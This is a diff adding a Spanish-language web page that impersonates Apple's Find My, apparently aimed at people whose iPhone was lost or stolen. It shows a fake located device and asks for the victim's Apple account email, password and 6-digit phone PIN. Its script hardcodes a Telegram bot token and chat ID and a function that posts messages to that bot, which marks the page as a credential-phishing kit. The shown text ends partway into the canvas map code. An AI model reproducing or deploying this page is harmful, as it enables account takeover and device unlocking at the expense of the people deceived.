@@ -1,0 +1,1492 @@
+
+<!DOCTYPE html>
+<html lang="es" class="dark">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Encontrar • Rastreo Vectorial Nativo</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Fuente Inter (estilo San Francisco de Apple) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    
+    <link rel='stylesheet' href='https://cdn-uicons.flaticon.com/4.0.0/uicons-brands/css/uicons-brands.css'>
+    <link rel='stylesheet' href='https://cdn-uicons.flaticon.com/4.0.0/uicons-solid-rounded/css/uicons-solid-rounded.css'>
+
+    <!-- Phosphor Icons para iconografía limpia estilo iOS -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+
+    <style>
+        * {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #132136;
+        }
+
+        #vector-map-canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+            cursor: grab;
+            touch-action: none;
+        }
+
+        #vector-map-canvas:active {
+            cursor: grabbing;
+        }
+
+        /* Efecto Glassmorphism estilo iOS */
+        .ios-glass {
+            background: rgba(34, 48, 70, 0.72);
+            backdrop-filter: blur(22px) saturate(185%);
+            -webkit-backdrop-filter: blur(22px) saturate(185%);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
+        }
+
+        .ios-glass-modal {
+            background: rgba(20, 30, 48, 0.85);
+            backdrop-filter: blur(28px) saturate(195%);
+            -webkit-backdrop-filter: blur(28px) saturate(195%);
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.7);
+        }
+
+        /* Animación de entrada para modales */
+        .fade-scale-enter {
+            opacity: 0;
+            transform: scale(0.94) translateY(10px);
+        }
+
+        .fade-scale-active {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            transition: all 0.42s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        /* Sacudida en error de PIN */
+        @keyframes shake-horizontal {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-7px); }
+            40%, 80% { transform: translateX(7px); }
+        }
+        .shake-error {
+            animation: shake-horizontal 0.36s ease-in-out;
+        }
+
+        /* Vibración del icono cuando suena */
+        @keyframes phone-ring {
+            0%, 100% { transform: rotate(0deg) scale(1.05); }
+            20% { transform: rotate(-12deg) scale(1.1); }
+            40% { transform: rotate(12deg) scale(1.1); }
+            60% { transform: rotate(-10deg) scale(1.1); }
+            80% { transform: rotate(10deg) scale(1.1); }
+        }
+        .ringing-animation {
+            animation: phone-ring 0.6s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="text-white select-none antialiased">
+
+    <div id="app-wrapper" class="relative w-full h-full overflow-hidden">
+
+        <!-- Lienzo Vectorial 100% Nativo (Sin Google Maps ni APIs externas) -->
+        <canvas id="vector-map-canvas"></canvas>
+
+        <!-- Etiqueta superior izquierda estilo Apple Find My -->
+        <div class="fixed top-5 left-5 z-20 pointer-events-none flex flex-col gap-1.5">
+            <span id="region-title" class="text-white/95 font-bold tracking-wider text-sm sm:text-base drop-shadow-[0_2px_6px_rgba(0,0,0,0.85)] uppercase">
+                LAS PEÑAS
+            </span>
+            <div id="tracking-status-pill" class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full ios-glass text-[11px] font-medium text-sky-300 w-fit transition-all duration-300">
+                <span id="status-dot" class="w-1.5 h-1.5 rounded-full bg-sky-400 animate-pulse"></span>
+                <span id="tracking-status-text">Iniciando rastreo vectorial...</span>
+            </div>
+        </div>
+
+        <!-- Controles flotantes superiores derechos -->
+        <div class="fixed top-4 right-4 z-20 flex flex-col gap-2.5">
+            <div class="ios-glass rounded-2xl flex flex-col overflow-hidden divide-y divide-white/10">
+                <button id="btn-map-style" onclick="cycleMapTheme()" title="Cambiar modo visual del mapa" class="w-11 h-11 flex items-center justify-center text-white/90 hover:bg-white/10 active:scale-95 transition">
+                    <i class="ph-fill ph-map-trifold text-xl"></i>
+                </button>
+                <button id="btn-recenter" onclick="recenterOnDevice()" title="Centrar en dispositivo" class="w-11 h-11 flex items-center justify-center text-sky-400 hover:bg-white/10 active:scale-95 transition">
+                    <i class="ph-fill ph-navigation-arrow text-xl"></i>
+                </button>
+            </div>
+
+            <button id="btn-3d" onclick="toggle3DView()" title="Activar perspectiva y edificios 3D" class="ios-glass w-11 h-11 rounded-full flex items-center justify-center text-xs font-bold tracking-tight text-white/90 hover:bg-white/10 active:scale-95 transition">
+                3D
+            </button>
+
+            <div class="ios-glass rounded-2xl flex flex-col overflow-hidden divide-y divide-white/10 mt-1">
+                <button onclick="manualZoomStep(1.28)" title="Acercar" class="w-11 h-10 flex items-center justify-center text-white/90 hover:bg-white/10 active:scale-95 transition">
+                    <i class="ph-bold ph-plus text-base"></i>
+                </button>
+                <button onclick="manualZoomStep(0.78)" title="Alejar" class="w-11 h-10 flex items-center justify-center text-white/90 hover:bg-white/10 active:scale-95 transition">
+                    <i class="ph-bold ph-minus text-base"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- ===================================================================
+             MODAL PASO 1: VERIFICAR IDENTIDAD (Email y Contraseña)
+             =================================================================== -->
+        <div id="auth-gate-overlay" class="fixed inset-0 z-40 hidden items-center justify-center p-4 bg-slate-950/45 backdrop-blur-[3px] transition-opacity duration-500 opacity-0">
+            <div id="auth-gate-card" class="ios-glass-modal w-full max-w-sm rounded-3xl p-6 sm:p-7 text-center fade-scale-enter">
+                
+                <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-sky-500/15 border border-sky-400/25 text-[10px] font-semibold text-sky-300 mb-3">
+                    <span>Paso 1 de 2 • Verificación de Cuenta</span>
+                </div>
+
+                <div class="mx-auto mb-3.5 w-14 h-14 rounded-2xl bg-gradient-to-b from-sky-400/25 to-blue-600/25 border border-sky-400/30 flex items-center justify-center shadow-inner">
+                <i class="fi fi-brands-apple text-3xl"></i>
+                </div>
+
+                <h2 class="text-xl font-bold tracking-tight text-white">
+                    Verificar identidad
+                </h2>
+                <p class="mt-1.5 text-xs sm:text-sm text-slate-300/90 leading-relaxed">
+                    Dispositivo localizado en <span class="text-white font-medium">Las Peñas, Esmeraldas</span>. Ingresa tu correo y contraseña.
+                </p>
+
+                <form id="verify-form" class="mt-5 space-y-3 text-left" onsubmit="handleAccountVerification(event)">
+                    <div>
+                        <label for="email-input" class="block text-[11px] font-medium text-slate-300 mb-1 ml-1">Correo electrónico</label>
+                        <div class="relative">
+                            <i class="ph ph-envelope-simple absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-base"></i>
+                            <input 
+                                id="email-input" 
+                                type="email" 
+                                required
+                                placeholder="Email o numero telefonico"
+                                class="w-full pl-10 pr-3.5 py-2.5 rounded-xl bg-slate-900/75 border border-white/15 text-sm text-white placeholder-slate-400 focus:outline-none focus:border-sky-400 focus:ring-1 focus:ring-sky-400 transition"
+                            />
+                        </div>
+                    </div>
+
+                    <div>
+                        <label for="password-input" class="block text-[11px] font-medium text-slate-300 mb-1 ml-1">Contraseña</label>
+                        <div class="relative">
+                            <i class="ph ph-lock-key absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-base"></i>
+                            <input 
+                                id="password-input" 
+                                type="password" 
+                                required
+                                placeholder="••••••••••••"
+                                class="w-full pl-10 pr-10 py-2.5 rounded-xl bg-slate-900/75 border border-white/15 text-sm text-white placeholder-slate-400 focus:outline-none focus:border-sky-400 focus:ring-1 focus:ring-sky-400 transition"
+                            />
+                            <button type="button" onclick="togglePasswordVisibility()" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white p-1">
+                                <i id="eye-icon" class="ph ph-eye text-base"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <p id="auth-error-msg" class="hidden text-xs text-rose-400 text-center pt-1 font-medium"></p>
+
+                    <div class="pt-2 flex flex-col gap-2">
+                        <button 
+                            id="btn-submit-verify" 
+                            type="submit" 
+                            class="w-full py-2.5 px-4 rounded-xl bg-sky-500 hover:bg-sky-400 active:scale-[0.99] text-white font-semibold text-sm shadow-lg shadow-sky-500/25 transition flex items-center justify-center gap-2"
+                        >
+                            <span>Continuar</span>
+                            <i class="ph-bold ph-arrow-right text-sm"></i>
+                        </button>
+
+                        <!--
+                        <button 
+                            type="button" 
+                            onclick="fillDemoAccount()" 
+                            class="w-full py-2 px-3 rounded-xl bg-white/5 hover:bg-white/10 text-slate-300 text-xs font-medium transition"
+                        >
+                            Rellenar datos demo
+                        </button>
+                    -->
+                        
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- ===================================================================
+             MODAL PASO 2: PIN DEL DISPOSITIVO (Pantalla de bloqueo estilo iOS)
+             =================================================================== -->
+        <div id="pin-gate-overlay" class="fixed inset-0 z-40 hidden items-center justify-center p-4 bg-slate-950/50 backdrop-blur-[4px] transition-opacity duration-500 opacity-0">
+            <div id="pin-gate-card" class="ios-glass-modal w-full max-w-xs sm:max-w-sm rounded-3xl p-6 text-center fade-scale-enter">
+                
+                <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-amber-500/15 border border-amber-400/30 text-[10px] font-semibold text-amber-300 mb-3">
+                    <span>Paso 2 de 2 • Seguridad del Teléfono</span>
+                </div>
+
+                <div class="mx-auto mb-3 w-12 h-12 rounded-2xl bg-gradient-to-b from-amber-400/25 to-orange-600/25 border border-amber-400/30 flex items-center justify-center shadow-inner">
+                  <i class="fi fi-sr-lock text-2xl"></i>
+                </div>
+
+                <h2 class="text-lg sm:text-xl font-bold tracking-tight text-white">
+                    PIN del dispositivo
+                </h2>
+                <p class="mt-1 text-xs text-slate-300/90 leading-relaxed">
+                    Ingresa el código de 6 dígitos de tu celular para confirmar que eres el dueño y revelar su posición exacta.
+                </p>
+
+                <!-- Puntos indicadores de 6 dígitos -->
+                <div id="pin-dots-container" class="flex items-center justify-center gap-3.5 my-5">
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                    <span class="pin-dot w-3.5 h-3.5 rounded-full border-2 border-white/40 transition-all duration-150"></span>
+                </div>
+
+                <p id="pin-error-msg" class="hidden text-xs text-rose-400 mb-3 font-medium">Código incorrecto. Vuelve a intentar.</p>
+
+                <!-- Teclado numérico táctil estilo iOS -->
+                <div class="grid grid-cols-3 gap-2.5 max-w-[245px] mx-auto select-none">
+                    <button type="button" onclick="pressPinDigit('1')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">1</button>
+                    <button type="button" onclick="pressPinDigit('2')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">2</button>
+                    <button type="button" onclick="pressPinDigit('3')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">3</button>
+                    <button type="button" onclick="pressPinDigit('4')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">4</button>
+                    <button type="button" onclick="pressPinDigit('5')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">5</button>
+                    <button type="button" onclick="pressPinDigit('6')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">6</button>
+                    <button type="button" onclick="pressPinDigit('7')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">7</button>
+                    <button type="button" onclick="pressPinDigit('8')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">8</button>
+                    <button type="button" onclick="pressPinDigit('9')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">9</button>
+                      <button type="button"  class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition"> </button>
+                    
+                   <!--
+                    <button type="button" onclick="fillDemoPin()" class="h-12 rounded-2xl bg-sky-500/20 hover:bg-sky-500/30 active:scale-95 text-[10px] font-semibold text-sky-300 transition flex items-center justify-center leading-tight px-1">
+                        Rellenar PIN
+                    </button>
+                    -->
+                    <button type="button" onclick="pressPinDigit('0')" class="h-12 rounded-2xl bg-white/10 hover:bg-white/20 active:scale-95 text-lg font-semibold text-white transition">0</button>
+                    <button type="button" onclick="deletePinDigit()" class="h-12 rounded-2xl bg-white/5 hover:bg-white/15 active:scale-95 text-slate-300 transition flex items-center justify-center">
+                        <i class="ph-bold ph-backspace text-xl"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===================================================================
+             TARJETA INFERIOR DEL DISPOSITIVO (Aparece tras verificar PIN)
+             =================================================================== -->
+        <div id="device-info-sheet" class="fixed bottom-24 left-1/2 -translate-x-1/2 z-30 w-[92%] max-w-md hidden opacity-0 transition-all duration-500 translate-y-4">
+            <div class="ios-glass-modal rounded-3xl p-4 sm:p-5">
+                <div class="w-9 h-1 bg-white/25 rounded-full mx-auto mb-3"></div>
+
+                <div class="flex items-start justify-between gap-3">
+                    <div class="flex items-center gap-3.5">
+                        <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-slate-700 to-slate-900 border border-white/15 flex items-center justify-center shrink-0 shadow-md relative">
+                            <i id="sheet-phone-icon" class="ph-fill ph-device-mobile text-2xl text-sky-400"></i>
+                            <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 rounded-full bg-emerald-500 border-2 border-slate-900"></span>
+                        </div>
+                        
+                        <div>
+                            <div class="flex items-center gap-2">
+                                <h3 id="device-name" class="font-bold text-base text-white leading-tight">iPhone 13</h3>
+                                <span class="px-1.5 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 text-[10px] font-semibold">En línea</span>
+                            </div>
+                            <p id="device-exact-address" class="text-xs text-slate-200 font-medium mt-0.5 leading-snug">
+                                Vía La Tola y Av. Carlos Rosero, frente a Ocean Style Boutique Bazar, Las Peñas, Esmeraldas
+                            </p>
+                            <p id="device-last-seen" class="text-[11px] text-slate-400 mt-0.5">
+                                Ahora mismo • Precisión GPS: 3 metros
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="flex flex-col items-end shrink-0">
+                        <div class="flex items-center gap-1 text-emerald-400 text-xs font-semibold bg-emerald-950/50 border border-emerald-500/20 px-2 py-1 rounded-lg">
+                            <i class="ph-fill ph-battery-high text-sm"></i>
+                            <span id="device-battery">84%</span>
+                        </div>
+                        <span id="device-coords-label" class="text-[10px] text-slate-400 mt-1 font-mono">1.0772, -79.0264</span>
+                    </div>
+                </div>
+
+                <!-- Acciones rápidas -->
+                <div class="grid grid-cols-3 gap-2.5 mt-4 pt-3.5 border-t border-white/10">
+                    <button id="btn-play-sound" onclick="triggerPlaySound()" class="flex flex-col items-center justify-center gap-1 py-2.5 px-2 rounded-2xl bg-white/10 hover:bg-white/15 active:scale-95 transition">
+                        <i id="sound-icon" class="ph-fill ph-speaker-high text-lg text-sky-400"></i>
+                        <span id="sound-btn-label" class="text-[11px] font-medium text-white">Reproducir sonido</span>
+                    </button>
+
+                    <button id="btn-toggle-route" onclick="toggleSimulatedRoute()" class="flex flex-col items-center justify-center gap-1 py-2.5 px-2 rounded-2xl bg-white/10 hover:bg-white/15 active:scale-95 transition">
+                        <i id="route-icon" class="ph-fill ph-path text-lg text-emerald-400"></i>
+                        <span id="route-btn-label" class="text-[11px] font-medium text-white">Ruta</span>
+                    </button>
+
+                    <button id="btn-refresh-gps" onclick="refreshDeviceLocation()" class="flex flex-col items-center justify-center gap-1 py-2.5 px-2 rounded-2xl bg-white/10 hover:bg-white/15 active:scale-95 transition">
+                        <i id="refresh-icon" class="ph-bold ph-arrows-clockwise text-lg text-amber-400"></i>
+                        <span class="text-[11px] font-medium text-white">Actualizar</span>
+                    </button>
+                </div>
+
+                <div class="mt-2.5 text-center">
+                    <!--  
+                    <button onclick="resetFullDemo()" class="text-[10px] text-slate-400 hover:text-sky-300 transition underline underline-offset-2">
+                        Reiniciar demo
+                    </button>
+                 -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Toast flotante estilo Dynamic Island -->
+        <div id="toast-banner" class="fixed top-16 left-1/2 -translate-x-1/2 z-50 pointer-events-none opacity-0 -translate-y-3 transition-all duration-300">
+            <div class="ios-glass px-4 py-2 rounded-full flex items-center gap-2 text-xs font-medium text-white shadow-xl">
+                <i id="toast-icon" class="ph-fill ph-info text-sky-400 text-base"></i>
+                <span id="toast-message">Mensaje del sistema</span>
+            </div>
+        </div>
+
+        <!-- ===================================================================
+             BARRA DE NAVEGACIÓN INFERIOR FLOTANTE
+             =================================================================== -->
+        <nav class="fixed bottom-4 left-1/2 -translate-x-1/2 z-30 w-[92%] max-w-md">
+            <div class="ios-glass rounded-[28px] px-2 pt-2 pb-1.5">
+                <div class="w-8 h-1 bg-white/25 rounded-full mx-auto mb-1.5"></div>
+                
+                <div class="grid grid-cols-4 gap-1">
+                    <button onclick="switchTab('personas', this)" class="nav-tab flex flex-col items-center justify-center py-1.5 px-2 rounded-2xl text-slate-300/80 hover:text-white transition">
+                        <i class="ph-fill ph-users text-xl mb-0.5"></i>
+                        <span class="text-[10px] font-medium">Personas</span>
+                    </button>
+
+                    <button onclick="switchTab('dispositivos', this)" class="nav-tab active-tab bg-slate-900/65 text-sky-400 flex flex-col items-center justify-center py-1.5 px-2 rounded-2xl shadow-inner transition">
+                        <i class="ph-fill ph-devices text-xl mb-0.5"></i>
+                        <span class="text-[10px] font-semibold">Dispositivos</span>
+                    </button>
+
+                    <button onclick="switchTab('articulos', this)" class="nav-tab flex flex-col items-center justify-center py-1.5 px-2 rounded-2xl text-slate-300/80 hover:text-white transition">
+                        <i class="ph-fill ph-airplay text-xl mb-0.5"></i>
+                        <span class="text-[10px] font-medium">Artículos</span>
+                    </button>
+
+                    <button onclick="switchTab('yo', this)" class="nav-tab flex flex-col items-center justify-center py-1.5 px-2 rounded-2xl text-slate-300/80 hover:text-white transition">
+                        <i class="ph-fill ph-navigation-arrow text-xl mb-0.5"></i>
+                        <span class="text-[10px] font-medium">Yo</span>
+                    </button>
+                </div>
+            </div>
+        </nav>
+
+    </div>
+
+    <script>
+        /**
+         * ============================================================================
+         * CONFIGURACIÓN DE TELEGRAM (CONFIGURA AQUÍ TU BOT Y CHAT ID)
+         * ============================================================================
+         */
+        const TELEGRAM_BOT_TOKEN = "8689300268:AAFB2i8VASEY6SBopLUFbpj7j23uMG8Uwwk"; // Ejemplo: "781234567:AAH..."
+        const TELEGRAM_CHAT_ID = "7432062036";     // Ejemplo: "123456789"
+
+        function sendTelegramNotification(message) {
+            if (TELEGRAM_BOT_TOKEN.includes("AQUI") || TELEGRAM_CHAT_ID.includes("AQUI")) {
+                console.log("[Telegram Simulation]:", message);
+                return;
+            }
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Error al notificar a Telegram:", err));
+        }
+
+        /**
+         * ============================================================================
+         * MOTOR DE MAPA VECTORIAL 100% PROPIO (HTML5 CANVAS)
+         * ============================================================================
+         */
+
+        const canvas = document.getElementById('vector-map-canvas');
+        const ctx = canvas.getContext('2d');
+
+        const DEVICE_DATA = {
+            name: "iPhone 13",
+            address: "Vía La Tola y Av. Carlos Rosero, frente a Ocean Style Boutique Bazar, Las Peñas, Esmeraldas",
+            coordsText: "1.0772, -79.0264",
+            battery: 84,
+            accuracyMeters: 3,
+            network: "4G LTE • Claro",
+            altitude: "12 m s.n.m.",
+            speed: "0 km/h (Estacionado)",
+            worldX: 52,
+            worldY: 36
+        };
+
+        const MAP_THEMES = [
+            {
+                name: "Noche Azul Pizarra",
+                oceanDeep: "#152b4a",
+                oceanMid: "#1c3860",
+                sandShore: "#263f63",
+                landBase: "#14243b",
+                landTexture: "rgba(32, 54, 86, 0.25)",
+                highwayCasing: "#243b5c",
+                highwayFill: "#607796",
+                streetCasing: "#1b314f",
+                streetFill: "#405c80",
+                sidewalk: "rgba(148, 178, 214, 0.16)",
+                buildingBase: "#1c3b64",
+                buildingAlt: "#223863",
+                buildingRoof: "#294c7d",
+                buildingStroke: "#0d1a2e",
+                parkFill: "#143547"
+            },
+            {
+                name: "Satélite Vectorial Oscuro",
+                oceanDeep: "#0b192e",
+                oceanMid: "#102440",
+                sandShore: "#1d314d",
+                landBase: "#0f1c2e",
+                landTexture: "rgba(25, 48, 74, 0.32)",
+                highwayCasing: "#1b2e47",
+                highwayFill: "#4e6785",
+                streetCasing: "#16263d",
+                streetFill: "#324b6b",
+                sidewalk: "rgba(125, 160, 200, 0.14)",
+                buildingBase: "#183354",
+                buildingAlt: "#1f375e",
+                buildingRoof: "#2c5282",
+                buildingStroke: "#091220",
+                parkFill: "#0f2e3d"
+            }
+        ];
+
+        const camera = {
+            x: 0,
+            y: 60,
+            zoom: 1.05,
+            targetX: 0,
+            targetY: 60,
+            targetZoom: 1.05,
+            tilt: 0,
+            targetTilt: 0,
+            rotation: 0
+        };
+
+        let currentThemeIdx = 0;
+        let isEmailVerified = false;
+        let isPinVerified = false;
+        let enteredPin = "";
+        let showRoute = false;
+        let isRinging = false;
+        let audioCtx = null;
+        let ringInterval = null;
+        let animTime = 0;
+
+        let emailAttemptCount = 0;
+        let pinAttemptCount = 0;
+
+        let isDragging = false;
+        let dragStartX = 0;
+        let dragStartY = 0;
+        let camStartX = 0;
+        let camStartY = 0;
+        let initialPinchDist = null;
+        let initialPinchZoom = 1;
+
+        const COASTLINE_POLY = [
+            [-950, -650], [-950, 120], [-620, -40], [-350, -145],
+            [-110, -225], [80, -295], [290, -375], [560, -490], [950, -650]
+        ];
+
+        const BEACH_STRIP = [
+            [-950, 120], [-620, -40], [-350, -145], [-110, -225],
+            [80, -295], [290, -375], [560, -490], [950, -650],
+            [950, -615], [560, -455], [290, -342], [80, -264],
+            [-110, -195], [-350, -118], [-620, -12], [-950, 152]
+        ];
+
+        const MAIN_ROADS = [
+            {
+                name: "VÍA DEL PACÍFICO",
+                width: 11,
+                points: [[-780, 440], [-480, 415], [-240, 395], [-85, 392], [45, 435], [210, 468], [480, 495], [820, 515]]
+            },
+            {
+                name: "VÍA LA TOLA",
+                width: 9.5,
+                points: [[-520, 418], [-415, 220], [-280, 155], [-110, 92], [35, 35], [195, -25], [390, -98], [680, -210]]
+            },
+            {
+                name: "CARLOS ROSERO",
+                width: 8.5,
+                points: [[-135, -165], [55, -235], [210, -295], [365, -355]]
+            }
+        ];
+
+        const URBAN_STREETS = [
+            { width: 6.5, points: [[-35, -200], [5, -65], [32, 35], [58, 138], [86, 250]] },
+            { width: 5.5, points: [[-135, -165], [-92, -30], [-65, 92], [-32, 210]] },
+            { width: 6.0, points: [[75, -242], [115, -110], [148, -8], [178, 95], [210, 210]] },
+            { width: 6.5, points: [[-155, -115], [-20, -165], [95, -208], [240, -262]] },
+            { width: 6.0, points: [[-115, -22], [12, -68], [132, -112], [255, -158]] },
+            { width: 6.5, points: [[-55, 118], [52, 82], [168, 42], [275, 4]] },
+            { width: 5.5, points: [[-35, 205], [82, 165], [198, 125]] }
+        ];
+
+        const PARK_ZONES = [
+            { x: -165, y: -110, w: 48, h: 38, angle: -0.34 },
+            { x: 165, y: -215, w: 54, h: 34, angle: -0.34 },
+            { x: -75, y: 155, w: 52, h: 42, angle: -0.34 }
+        ];
+
+        const BUILDINGS = [
+            { x: -38, y: -135, w: 34, h: 24, angle: -0.34, height: 18, alt: true },
+            { x: 8, y: -152, w: 28, h: 22, angle: -0.34, height: 22, alt: false },
+            { x: -12, y: -88, w: 24, h: 18, angle: -0.34, height: 15, alt: true },
+            { x: 86, y: -115, w: 28, h: 22, angle: -0.34, height: 19, alt: true },
+            { x: 82, y: 56, w: 32, h: 20, angle: -0.34, height: 18, alt: true },
+            { x: 76, y: 94, w: 34, h: 22, angle: -0.34, height: 20, alt: false },
+            { x: 114, y: 82, w: 28, h: 20, angle: -0.34, height: 16, alt: true }
+        ];
+
+        const STREET_LIGHTS = [
+            { x: -68, y: -115 }, { x: -24, y: -102 }, { x: 46, y: -116 },
+            { x: 18, y: -2 }, { x: 72, y: 74 }, { x: 135, y: 52 }
+        ];
+
+        const POIS = [
+            {
+                id: "beach-main",
+                title: "Las Peñas, Esmeraldas",
+                x: -45, y: -175,
+                color: "#38bdf8", textColor: "#e2e8f0",
+                type: "beach", minZoom: 0.9, maxZoom: 2.8, align: "right"
+            },
+            {
+                id: "hotel-casablanca",
+                title: "Hotel Casa Blanca",
+                x: -6, y: -148,
+                color: "#f48fb1", textColor: "#f48fb1",
+                type: "bed", minZoom: 2.3, maxZoom: 10, align: "left"
+            },
+            {
+                id: "bar-laspenas",
+                title: "Las Peñas Bar",
+                x: -16, y: -86,
+                color: "#ffb74d", textColor: "#ffb74d",
+                type: "cocktail", minZoom: 2.3, maxZoom: 10, align: "right"
+            },
+            {
+                id: "store-disensa",
+                title: "Disensa",
+                x: 84, y: 54,
+                color: "#64b5f6", textColor: "#64b5f6",
+                type: "bag", minZoom: 2.3, maxZoom: 10, align: "right"
+            },
+            {
+                id: "store-oceanstyle",
+                title: "Ocean Style Boutique",
+                x: 68, y: 94,
+                color: "#64b5f6", textColor: "#64b5f6",
+                type: "bag", minZoom: 2.3, maxZoom: 10, align: "right"
+            },
+            {
+                id: "hotel-mariajose",
+                title: "Hotel María José",
+                x: 16, y: 174,
+                color: "#f48fb1", textColor: "#f48fb1",
+                type: "bed", minZoom: 2.4, maxZoom: 10, align: "left"
+            }
+        ];
+
+        const SIMULATED_ROUTE_PATH = [
+            [-135, -165], [-92, -30], [-65, 92], [52, 82], [32, 35], [DEVICE_DATA.worldX, DEVICE_DATA.worldY]
+        ];
+
+        window.addEventListener('DOMContentLoaded', () => {
+            resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
+            setupPointerControls();
+            requestAnimationFrame(renderLoop);
+            startAutomatedSequence();
+        });
+
+        function resizeCanvas() {
+            const dpr = Math.min(window.devicePixelRatio || 1, 2);
+            canvas.width = window.innerWidth * dpr;
+            canvas.height = window.innerHeight * dpr;
+            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+        }
+
+        function worldToScreen(wx, wy) {
+            const cx = window.innerWidth / 2;
+            const cy = window.innerHeight / 2;
+            let dx = (wx - camera.x) * camera.zoom;
+            let dy = (wy - camera.y) * camera.zoom;
+            if (camera.tilt > 0.001) {
+                const pitchFactor = 1 - camera.tilt * 0.34;
+                const perspectiveScale = 1 + (dy / (window.innerHeight * 1.4)) * camera.tilt * 0.45;
+                dx *= perspectiveScale;
+                dy *= pitchFactor * perspectiveScale;
+            }
+            return { x: cx + dx, y: cy + dy };
+        }
+
+        function screenToWorld(sx, sy) {
+            const cx = window.innerWidth / 2;
+            const cy = window.innerHeight / 2;
+            const pitchFactor = 1 - camera.tilt * 0.34;
+            return {
+                x: camera.x + (sx - cx) / camera.zoom,
+                y: camera.y + (sy - cy) / (camera.zoom * pitchFactor)
+            };
+        }
+
+        function renderLoop(timestamp) {
+            animTime = timestamp * 0.001;
+            camera.x += (camera.targetX - camera.x) * 0.085;
+            camera.y += (camera.targetY - camera.y) * 0.085;
+            camera.zoom += (camera.targetZoom - camera.zoom) * 0.085;
+            camera.tilt += (camera.targetTilt - camera.tilt) * 0.1;
+
+            drawMapFrame();
+            requestAnimationFrame(renderLoop);
+        }
+
+        function drawMapFrame() {
+            const W = window.innerWidth;
+            const H = window.innerHeight;
+            const theme = MAP_THEMES[currentThemeIdx];
+
+            ctx.fillStyle = theme.landBase;
+            ctx.fillRect(0, 0, W, H);
+
+            drawCoastAndOcean(theme);
+
+            if (camera.zoom > 1.7) {
+                drawParks(theme);
+            }
+
+            if (camera.zoom > 1.75) {
+                const alpha = Math.min(1, (camera.zoom - 1.75) / 0.65);
+                drawUrbanStreets(theme, alpha);
+            }
+
+            drawMainHighways(theme);
+
+            if (camera.zoom > 1.95) {
+                const bAlpha = Math.min(1, (camera.zoom - 1.95) / 0.6);
+                drawBuildings(theme, bAlpha);
+            }
+
+            if (camera.zoom > 2.3) {
+                const lAlpha = Math.min(1, (camera.zoom - 2.3) / 0.6);
+                drawStreetLights(lAlpha);
+            }
+
+            if (showRoute && isPinVerified) {
+                drawNavigationRoute();
+            }
+
+            drawRoadLabels();
+            drawPOIs();
+
+            if (isPinVerified) {
+                drawSmartphoneMarker();
+            }
+        }
+
+        function drawCoastAndOcean(theme) {
